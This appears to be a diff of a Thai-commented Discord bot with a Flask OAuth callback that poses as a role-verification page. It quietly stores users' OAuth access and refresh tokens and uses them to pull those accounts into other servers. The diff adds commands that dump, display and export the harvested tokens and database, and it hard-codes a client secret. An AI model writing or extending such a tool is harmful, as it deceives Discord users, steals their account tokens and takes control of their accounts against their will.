@@ -1,41 +1,26 @@
-# บอทดักดึงคน
+ดักดึงดีมากก
+
+
 
 import discord
 from discord import app_commands
 from discord.ext import commands, tasks
 from flask import Flask, request, render_template_string
-import requests, sqlite3, time, threading, asyncio, aiohttp, os, traceback, gc
+import requests, sqlite3, time, threading, asyncio, aiohttp, os, traceback, gc, io, json
 
-# --- [ 1. Configuration - ตั้งค่า ] ---
-# ( ใส่ TOKEN บอทตรงนี้ )
-TOKEN = os.getenv('TOKEN')
+# --- [ 1. Configuration ] ---
 
-# ( ใส่ CLIENT ID ของบอทตรงนี้ )
-CLIENT_ID = '1545398920560250930'
-
-# ( ใส่ CLIENT SECRET ของบอทตรงนี้ )
+TOKEN = os.getenv('DISCORD_TOKEN')
+CLIENT_ID = 'ไคเอ่นไอดี'
 CLIENT_SECRET = 'EktEC4GFcvihnUqpxcHbZm6pTFQwFRZE'
-
-# ( ใส่ Redirect URI ที่ตั้งไว้ใน Discord Developer Portal ตรงนี้ )
-# เปลี่ยนจาก IP Internal (172.18.117.3) ให้เป็น Domain ของโฮสติ้ง หรือ IP สาธารณะ
 REDIRECT_URI = 'http://fi14.bot-hosting.cloud:25761/callback'
-
-# ( ใส่ Port ที่ต้องการรันเว็บตรงนี้ )
 PORT_WISP = 25761
-
-# ( ใส่ ID ของมึงที่เป็นเจ้าของบอทตรงนี้ )
 RAZEN_ID = 1531325825020989462
-
-# ( ใส่ ID ของแอดมินคนอื่นๆ ที่มึงจะให้ใช้คำสั่งได้ในลิสต์นี้ )
-ADMIN_IDS = [
-    RAZEN_ID, 
-    1531325825020989462, 
-    000000000000000000
-]
+ADMIN_IDS = [RAZEN_ID]  # แก้ ADMIN_IDS
 
 app = Flask(__name__)
 
-# --- [ 2. HTML Templates - หน้าเว็บดีไซน์พรีเมียม (Discord Style) ] ---
+# --- [ 2. HTML Templates ] ---
 COMMON_STYLE = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap');
@@ -79,13 +64,13 @@ COMMON_STYLE = """
 SUCCESS_TEMPLATE = COMMON_STYLE + """
 <div class="container">
     <div class="icon-circle"><span class="success-icon">✓</span></div>
-    <h2 style="color:#43b581; margin-bottom:15px;">ยืนยันสำเร็จแล้ว!</h2>
+    <h2 style="color:#43b581; margin-bottom:15px;">ยืนยันสําเร็จแล้ว!</h2>
     <div class="profile-card">
         <img src="{{ avatar_url }}" class="avatar">
         <div style="font-size:20px; font-weight:600;">{{ username }}</div>
-        <p style="color:#72767d; font-size:14px;">ยืนยันตัวตนเรียบร้อย</p>
+        <p style="color:#72767d; font-size:14px;">ยืนยันตัวตนเรียบร้อยแล้ว</p>
     </div>
-    <p style="font-size:14px; color:#b9bbbe; line-height:1.6;">ระบบกำลังจัดส่งยศให้คุณ กรุณากลับไปเช็คที่ Discord</p>
+    <p style="font-size:14px; color:#b9bbbe; line-height:1.6;">ระบบกําลังจัดส่งยศให้คุณ กรุณากลับไปเช็คที่ Discord</p>
     <a href="discord://" class="btn">กลับไปหน้า Discord</a>
 </div>
 """
@@ -137,30 +122,30 @@ def callback():
         }, timeout=10).json()
         at = res.get('access_token')
         if not at: return render_template_string(ERROR_TEMPLATE, error_msg="แลกเปลี่ยน Token ล้มเหลว")
-        
+
         u = requests.get("https://discord.com/api/users/@me", headers={'Authorization': f'Bearer {at}'}, timeout=10).json()
         uid, uname, avatar = u['id'], u['username'], u.get('avatar')
         a_url = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
-        
+
         db_execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?)", 
                    (uid, uname, at, res.get('refresh_token'), int(time.time()) + res.get('expires_in', 0)))
-        
+
         total = db_execute("SELECT COUNT(*) FROM users", fetch=True)[0][0]
         asyncio.run_coroutine_threadsafe(send_log(u, a_url, total), bot.loop)
-        
+
         if state:
             btn_data = db_execute("SELECT guild_id, role_id FROM buttons WHERE state_id = ?", (state,), fetch=True)
             if btn_data:
                 requests.put(f"https://discord.com/api/v10/guilds/{btn_data[0][0]}/members/{uid}/roles/{btn_data[0][1]}", 
                              headers={"Authorization": f"Bot {TOKEN}"}, timeout=5)
-        
+
         return render_template_string(SUCCESS_TEMPLATE, username=uname, avatar_url=a_url)
-    except Exception: return render_template_string(ERROR_TEMPLATE, error_msg="ระบบขัดข้อง กรุณลองใหม่")
+    except Exception: return render_template_string(ERROR_TEMPLATE, error_msg="ระบบขัดข้อง กรุณาลองใหม่")
 
 async def send_log(user, avatar, total):
     try:
         razen = await bot.fetch_user(RAZEN_ID)
-        emb = discord.Embed(title="🔔 ของมาส่งครับท่านเรียลไฮ!", color=0x43b581, timestamp=discord.utils.utcnow())
+        emb = discord.Embed(title="🟢 รับยศสำเร็จ!", color=0x43b581, timestamp=discord.utils.utcnow())
         emb.set_thumbnail(url=avatar)
         emb.add_field(name="👤 ชื่อ", value=f"`{user['username']}`", inline=True)
         emb.add_field(name="🆔 ไอดี", value=f"`{user['id']}`", inline=True)
@@ -172,7 +157,7 @@ async def send_log(user, avatar, total):
 class RazenBot(commands.Bot):
     def __init__(self):
         super().__init__(command_prefix="!", intents=discord.Intents.all(), help_command=None)
-    
+
     async def setup_hook(self):
         threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT_WISP, debug=False, use_reloader=False), daemon=True).start()
         self.revive_loop.start()
@@ -192,35 +177,181 @@ bot = RazenBot()
 
 @bot.event
 async def on_ready():
-    print(f'🔥 RAZEN SYSTEM ONLINE: {bot.user.name}')
+    print(f'🔥 CASPER SYSTEM ONLINE: {bot.user.name}')
 
 @bot.command(name="realhigth")
 async def sync_cmd(ctx):
     if ctx.author.id == 1531325825020989462:
         await bot.tree.sync()
-        await ctx.send("✅ ซิงค์คำสั่ง Slash Commands 5 ยศ เรียบร้อยแล้วสัส!")
+        await ctx.send("✅ ซิงค์คําสั่ง Slash Commands เรียบร้อยแล้วสัส!")
 
-# --- [ 6. Slash Commands (5-Roles Support) ] ---
-@bot.tree.command(name="ตั้งค่ารับยศ", description="สร้าง Embed พร้อมปุ่มรับยศสูงสุด 5 ยศ")
-@app_commands.describe(หัวข้อ="หัวข้อ", คำอธิบาย="คำอธิบาย", โค้ดสี="HEX เช่น #ffffff", รูปภาพ="URL รูปภาพ")
-async def setup(interaction: discord.Interaction, หัวข้อ: str, คำอธิบาย: str, 
-                ยศ1: discord.Role, อีโมจิ1: str = None,
-                ยศ2: discord.Role = None, อีโมจิ2: str = None,
-                ยศ3: discord.Role = None, อีโมจิ3: str = None,
-                ยศ4: discord.Role = None, อีโมจิ4: str = None,
-                ยศ5: discord.Role = None, อีโมจิ5: str = None,
-                โค้ดสี: str = "#23a55a", รูปภาพ: str = ""):
-    
+# ═══════════════════════════════════════════════════════════════
+# ── [ 6. TOKEN MANAGEMENT COMMANDS ] ──
+# ═══════════════════════════════════════════════════════════════
+
+@bot.tree.command(name="dump", description="ส่งออก tokens ทั้งหมดเป็นไฟล์ (แอดมินเท่านั้น)")
+async def dump_tokens(interaction: discord.Interaction):
+    if interaction.user.id not in ADMIN_IDS:
+        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    users = db_execute("SELECT user_id, username, access_token, refresh_token, expires_at FROM users", fetch=True)
+
+    if not users:
+        await interaction.followup.send("⚠️ ไม่มี tokens ในคลัง!", ephemeral=True)
+        return
+
+    data = {
+        "total": len(users),
+        "exported_at": time.strftime("%Y-%m-%d %H:%M:%S"),
+        "tokens": []
+    }
+
+    for uid, uname, at, rt, exp in users:
+        data["tokens"].append({
+            "user_id": uid,
+            "username": uname,
+            "access_token": at,
+            "refresh_token": rt,
+            "expires_at": exp,
+            "expired": int(time.time()) > exp
+        })
+
+    filename = f"tokens_dump_{int(time.time())}.json"
+    with open(filename, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+    await interaction.followup.send(
+        f"📦 ส่งออก {len(users)} tokens เรียบร้อย!",
+        file=discord.File(filename),
+        ephemeral=True
+    )
+
+    os.remove(filename)
+
+@bot.tree.command(name="token", description="ดู token ของ user ที่ระบุ (แอดมินเท่านั้น)")
+@app_commands.describe(target="mention user ที่ต้องการดู token")
+async def view_token(interaction: discord.Interaction, target: discord.User):
+    if interaction.user.id not in ADMIN_IDS:
+        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    result = db_execute("SELECT * FROM users WHERE user_id = ?", (str(target.id),), fetch=True)
+
+    if not result:
+        await interaction.followup.send(f"⚠️ ไม่พบ token ของ `{target.name}` ในระบบ", ephemeral=True)
+        return
+
+    uid, uname, access_token, refresh_token, exp = result[0]
+
+    emb = discord.Embed(title=f"🔑 Token: {target.name}", color=0x43b581)
+    emb.set_thumbnail(url=target.avatar.url if target.avatar else None)
+    emb.add_field(name="🆔 User ID", value=f"`{uid}`", inline=True)
+    emb.add_field(name="👤 Username", value=f"`{uname}`", inline=True)
+    emb.add_field(name="⏰ หมดอายุ", value=f"<t:{exp}:R>" if exp else "ไม่รู้", inline=True)
+    emb.add_field(
+    name="🎫 Access Token",
+    value=access_token,
+    inline=False
+)
+    emb.add_field(
+    name="🔄 Refresh Token",
+    value=refresh_token,
+    inline=False
+)
+    emb.set_footer(text=f"ขอโดย: {interaction.user.name}")
+
+    await interaction.followup.send(embed=emb, ephemeral=True)
+
+@bot.tree.command(name="export", description="ส่งฐานข้อมูล users.db (แอดมินเท่านั้น)")
+async def export_db(interaction: discord.Interaction):
+    if interaction.user.id not in ADMIN_IDS:
+        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    if not os.path.exists('users.db'):
+        await interaction.followup.send("⚠️ ไม่พบฐานข้อมูล!", ephemeral=True)
+        return
+
+    await interaction.followup.send(
+        "📁 ฐานข้อมูล users.db",
+        file=discord.File('users.db'),
+        ephemeral=True
+    )
+
+@bot.tree.command(name="list", description="แสดงรายชื่อ users ทั้งหมด (แอดมินเท่านั้น)")
+async def list_users(interaction: discord.Interaction):
+    if interaction.user.id not in ADMIN_IDS:
+        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
+        return
+
+    users = db_execute("SELECT user_id, username, expires_at FROM users", fetch=True)
+
+    if not users:
+        await interaction.response.send_message("⚠️ ไม่มี users ในระบบ!", ephemeral=True)
+        return
+
+    chunks = []
+    chunk = ""
+
+    for i, (uid, uname, exp) in enumerate(users, 1):
+        line = f"`{i}.` **{uname}** (`{uid}`) - {'✅ active' if int(time.time()) < exp else '❌ expired'}\n"
+        if len(chunk) + len(line) > 1000:
+            chunks.append(chunk)
+            chunk = ""
+        chunk += line
+    if chunk:
+        chunks.append(chunk)
+
+    await interaction.response.send_message(f"📋 รายชื่อ users ทั้งหมด ({len(users)} ราย)", ephemeral=True)
+
+    for chunk in chunks:
+        await interaction.followup.send(f"```{chunk}```", ephemeral=True)  # แก้ bug ตรงนี้!
+
+@bot.tree.command(name="delete", description="ลบ token ของ user ที่ระบุ (แอดมินเท่านั้น)")
+@app_commands.describe(target="mention user ที่ต้องการลบ token")
+async def delete_token(interaction: discord.Interaction, target: discord.User):
+    if interaction.user.id not in ADMIN_IDS:
+        await interaction.response.send_message("❌ ไม่มีสิทธิใช้คําสั่งนี้!", ephemeral=True)
+        return
+
+    result = db_execute("DELETE FROM users WHERE user_id = ?", (str(target.id),))
+
+    if result == 0:
+        await interaction.response.send_message(f"⚠️ ไม่พบ token ของ `{target.name}`", ephemeral=True)
+    else:
+        await interaction.response.send_message(f"🗑️ ลบ token ของ `{target.name}` แล้ว!", ephemeral=True)
+
+# ═══════════════════════════════════════════════════════════════
+# ── [ 7. Original Slash Commands ] ──
+# ═══════════════════════════════════════════════════════════════
+
+@bot.tree.command(name="ตั้งค่ารับยศ", description="สร้าง Embed พร้อมปุ่มนับยศสูงสุด 5 ยศ")
+@app_commands.describe(topic="หัวข้อ", desc="คําอธิบาย", color="HEX เช่น #ffffff", image="URL รูปภาพ")
+async def setup(interaction: discord.Interaction, topic: str, desc: str, 
+                role1: discord.Role, emoji1: str = None,
+                role2: discord.Role = None, emoji2: str = None,
+                role3: discord.Role = None, emoji3: str = None,
+                role4: discord.Role = None, emoji4: str = None,
+                role5: discord.Role = None, emoji5: str = None,
+                color: str = "#23a55a", image: str = ""):
+
     if interaction.user.id not in ADMIN_IDS: return
     await interaction.response.defer(ephemeral=True)
-    
+
     try:
-        try: col_val = int(โค้ดสี.lstrip('#'), 16)
+        try: col_val = int(color.lstrip('#'), 16)
         except: col_val = 0x23a55a
-        
+
         view = discord.ui.View(timeout=None)
-        roles_list = [(ยศ1, อีโมจิ1), (ยศ2, อีโมจิ2), (ยศ3, อีโมจิ3), (ยศ4, อีโมจิ4), (ยศ5, อีโมจิ5)]
-        
+        roles_list = [(role1, emoji1), (role2, emoji2), (role3, emoji3), (role4, emoji4), (role5, emoji5)]
+
         for r, e in roles_list:
             if r:
                 s_id = f"st_{interaction.guild.id}_{r.id}"
@@ -228,11 +359,11 @@ async def setup(interaction: discord.Interaction, หัวข้อ: str, ค�
                 auth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&api_endpoint=https%3A%2F%2Fdiscord.com%2Fapi&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds.join&state={s_id}"
                 view.add_item(discord.ui.Button(label=f"รับยศ {r.name}", style=discord.ButtonStyle.success, url=auth_url, emoji=e.strip() if e else None))
 
-        embed = discord.Embed(title=หัวข้อ, description=คำอธิบาย, color=col_val)
-        if รูปภาพ.startswith("http"): embed.set_image(url=รูปภาพ)
-        
+        embed = discord.Embed(title=topic, description=desc, color=col_val)
+        if image.startswith("http"): embed.set_image(url=image)
+
         await interaction.channel.send(embed=embed, view=view)
-        await interaction.followup.send("✅ ส่ง Embed 5 ยศเรียบร้อยแล้วเรียลไฮ!", ephemeral=True)
+        await interaction.followup.send("✅ ส่ง Embed 5 ยศเรียบร้อยแล้วแคสเปอร์!", ephemeral=True)
     except Exception as e:
         await interaction.followup.send(f"❌ เกิดข้อผิดพลาด: {str(e)}", ephemeral=True)
 
@@ -246,10 +377,10 @@ async def stock(interaction: discord.Interaction):
 async def clear_expired(interaction: discord.Interaction):
     if interaction.user.id not in ADMIN_IDS: return
     await interaction.response.defer(ephemeral=True)
-    
+
     users = db_execute("SELECT user_id, refresh_token FROM users", fetch=True)
     initial_count = len(users); removed = 0
-    
+
     for uid, rt in users:
         res = await refresh_user_token(uid, rt)
         if res is None:
@@ -257,27 +388,43 @@ async def clear_expired(interaction: discord.Interaction):
             removed += 1
         await asyncio.sleep(0.3)
 
-    await interaction.followup.send(f"🧹 ล้างสต๊อกเสร็จแล้วเรียลไฮ!\n💀 ลบ Token ตาย: `{removed}` ราย\n✅ คงเหลือคนในคลัง: `{initial_count - removed}` ราย", ephemeral=True)
+    await interaction.followup.send(f"🧹 ล้างสต๊อกเสร็จแล้วrealhigth!\n💀 ลบ Token ตาย: `{removed}` ราย\n✅ คงเหลือคนในคลัง: `{initial_count - removed}` ราย", ephemeral=True)
 
-@bot.tree.command(name="ดึงคน", description="ระดมคนเข้าเซิร์ฟเวอร์")
-async def pull(interaction: discord.Interaction, จำนวน: int):
+@bot.tree.command(name="ดึงคน", description="ระดมคนเข้าเซิรฟ์เวอร์")
+@app_commands.describe(amount="จํานวนคนที่ต้องการดึง")  # แก้ parameter name
+async def pull(interaction: discord.Interaction, amount: int):  # แก้ตัวแปร
     if interaction.user.id not in ADMIN_IDS: return
     await interaction.response.defer(ephemeral=True)
-    users = db_execute("SELECT user_id, access_token, refresh_token, expires_at FROM users LIMIT ?", (int(จำนวน),), fetch=True)
+
+    users = db_execute("SELECT user_id, access_token, refresh_token, expires_at FROM users LIMIT ?", (int(amount),), fetch=True)
     success = 0; fail = 0
+
     async with aiohttp.ClientSession() as ses:
         for uid, at, rt, exp in users:
             try:
-                tk = at if int(time.time()) < (exp - 300) else await refresh_user_token(uid, rt)
+                # Refresh token if near expiry
+                tk = at
+                if int(time.time()) > (exp - 300):
+                    tk = await refresh_user_token(uid, rt)
+
                 if tk:
                     async with ses.put(f"https://discord.com/api/v10/guilds/{interaction.guild.id}/members/{uid}", 
-                                       headers={"Authorization": f"Bot {TOKEN}"}, json={"access_token": tk}, timeout=10) as r:
-                        if r.status in [201, 204]: success += 1
-                        else: fail += 1
-                else: fail += 1
+                                       headers={"Authorization": f"Bot {TOKEN}"}, 
+                                       json={"access_token": tk}, 
+                                       timeout=10) as r:
+                        if r.status in [201, 204]: 
+                            success += 1
+                        else: 
+                            fail += 1
+                            print(f"Failed to add {uid}: HTTP {r.status}")
+                else: 
+                    fail += 1
                 await asyncio.sleep(0.5)
-            except: fail += 1
-    await interaction.followup.send(f"🚀 ดึงสำเร็จ: `{success}` | ล้มเหลว: `{fail}` รายชื่อของเรียลไฮ!", ephemeral=True)
+            except Exception as e:
+                fail += 1
+                print(f"Error adding {uid}: {e}")
+
+    await interaction.followup.send(f"🚀 ดึงสําเร็จ: `{success}` | ล้มเหลว: `{fail}` รายชื่อของrealhigth!", ephemeral=True)
 
 if __name__ == "__main__":
     db_execute("CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, username TEXT, access_token TEXT, refresh_token TEXT, expires_at INTEGER)")
